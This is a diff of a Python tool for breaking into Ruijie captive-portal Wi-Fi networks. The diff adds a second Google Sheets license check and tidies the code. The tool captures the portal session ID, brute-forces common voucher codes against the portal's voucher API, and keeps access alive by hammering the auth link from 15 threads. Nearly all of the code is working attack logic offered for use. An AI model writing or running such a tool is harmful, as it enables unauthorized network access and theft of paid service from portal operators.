@@ -18,15 +18,20 @@ from datetime import datetime, date
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ===============================
-# ADVANCED CONFIGURATION
+# DUAL SHEET CONFIGURATION
 # ===============================
-SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRuFebZZ-vGXmobRjDU9C1dWRgcSjXwQ5YjK24Goh9rE0TQtoDXYaKBGWPs94_INOTUuzlXAiXAx42P/pub?output=csv"
+# Primary Sheet (Public CSV)
+SHEET_1_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRuFebZZ-vGXmobRjDU9C1dWRgcSjXwQ5YjK24Goh9rE0TQtoDXYaKBGWPs94_INOTUuzlXAiXAx42P/pub?output=csv"
+
+# Secondary Sheet (Exported CSV from your provided edit link)
+SHEET_2_URL = "https://docs.google.com/spreadsheets/d/1bpQMfIFQGKKeDFcCbGrpFBN8bRlfndrhfj_CdrDHAcw/export?format=csv"
+
 LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")
 LICENSE_INFO_FILE = os.path.expanduser("~/.ruijie_license_info.txt")
 
 # Turbo Engine Settings
-PING_THREADS = 15          # Increased for high-speed pulse
-MIN_INTERVAL = 0.05        # Minimal delay for aggressive bypass
+PING_THREADS = 15          
+MIN_INTERVAL = 0.05        
 MAX_INTERVAL = 0.2
 VOUCHER_LIST = ['123456', '888888', '111111', '000000', '999999', '12345678', '666666']
 
@@ -41,30 +46,46 @@ stop_event = threading.Event()
 
 def get_system_key():
     import uuid
-    return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]
+    # Generates a clean 8-character hardware-based key
+    full_key = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()
+    return full_key[:8]
 
 def check_approval():
     system_key = get_system_key()
     print(f"{CYAN}[*] System Key: {YELLOW}{system_key}{RESET}")
+    
     try:
-        r = requests.get(SHEET_CSV_URL, timeout=10)
-        if system_key in r.text:
+        # Check both sheets for the system key
+        resp1 = requests.get(SHEET_1_URL, timeout=10)
+        resp2 = requests.get(SHEET_2_URL, timeout=10)
+        
+        combined_data = resp1.text + resp2.text
+        
+        if system_key in combined_data:
             print(f"{GREEN}[✓] Access Granted: License Valid{RESET}")
             return True
-    except:
-        if os.path.exists(LICENSE_INFO_FILE): return True
+            
+    except Exception as e:
+        # Offline fallback if license file exists
+        if os.path.exists(LICENSE_INFO_FILE):
+            return True
+            
     print(f"{RED}[✗] Access Denied: Key Not Found{RESET}")
+    print(f"{YELLOW}[!] Add '{system_key}' to Row 1 of your Google Sheet to activate.{RESET}")
     return False
 
 def check_internet():
-    try: return requests.get("http://www.google.com", timeout=2).status_code == 200
-    except: return False
+    try:
+        return requests.get("http://www.google.com", timeout=2).status_code == 200
+    except:
+        return False
 
 def brute_force_voucher(portal_host, sid):
     session = requests.Session()
     print(f"{MAGENTA}[*] Initiating Brute Force Sequence...{RESET}")
     for code in VOUCHER_LIST:
-        if stop_event.is_set(): break
+        if stop_event.is_set(): 
+            break
         try:
             api = f"{portal_host}/api/auth/voucher/"
             payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
@@ -72,7 +93,8 @@ def brute_force_voucher(portal_host, sid):
             if "success" in res.text.lower():
                 print(f"{GREEN}[!] Exploit Success with Code: {code}{RESET}")
                 return True
-        except: continue
+        except:
+            continue
     return False
 
 def turbo_pulse(auth_link, sid):
@@ -82,7 +104,8 @@ def turbo_pulse(auth_link, sid):
         try:
             session.get(auth_link, headers=headers, timeout=2)
             print(f"{GREEN}[⚡] TURBO PULSE ACTIVE | SID: {sid[:6]}{RESET}", end="\r")
-        except: pass
+        except:
+            pass
         time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
 def start_engine():
@@ -90,16 +113,17 @@ def start_engine():
     while not stop_event.is_set():
         if check_internet():
             print(f"{YELLOW}[•] Connection Stable. Monitoring...{RESET}", end="\r")
-            time.sleep(10); continue
+            time.sleep(10)
+            continue
 
         try:
-            # Capture Portal URL
+            # Capture Portal URL for redirection
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True)
             portal_url = r.url
             parsed = urlparse(portal_url)
             portal_host = f"{parsed.scheme}://{parsed.netloc}"
             
-            # Extract Session ID
+            # Extract Session ID from URL or HTML
             sid = parse_qs(parsed.query).get('sessionId', [None])[0]
             if not sid:
                 html = requests.get(portal_url).text
@@ -119,10 +143,16 @@ def start_engine():
                 for _ in range(PING_THREADS):
                     threading.Thread(target=turbo_pulse, args=(auth_link, sid), daemon=True).start()
                 
-                while check_internet(): time.sleep(10)
-        except: time.sleep(5)
+                while check_internet(): 
+                    time.sleep(10)
+        except:
+            time.sleep(5)
 
 if __name__ == "__main__":
     if check_approval():
-        try: start_engine()
-        except KeyboardInterrupt: stop_event.set(); print(f"\n{RED}Engine Halted.{RESET}")
+        try:
+            start_engine()
+        except KeyboardInterrupt:
+            stop_event.set()
+            print(f"\n{RED}Engine Halted by User.{RESET}")
+            
